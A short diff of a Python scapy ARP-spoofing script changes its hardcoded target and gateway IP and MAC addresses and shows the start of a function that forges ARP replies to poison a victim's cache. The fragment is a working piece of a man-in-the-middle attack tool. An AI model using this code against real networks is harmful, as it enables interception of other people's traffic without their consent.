@@ -3,10 +3,10 @@ import time
 import argparse
 import sys
 
-targetIP="192.168.200.40"
-target_mac="B8:AE:ED:B3:87:8C"
-gatewayIP="192.168.0.1"
-gateway_mac="00:ad:24:f6:18:2a"
+targetIP="192.168.200.240"
+target_mac="D0:27:88:73:F3:44"
+gatewayIP="192.168.200.1"
+gateway_mac="e8:1c:ba:32:48:fb"
 
 def spoofer(targetIP, spoofIP,mac):
     packet=scapy.ARP(op=2,pdst=targetIP,hwdst=mac,psrc=spoofIP)
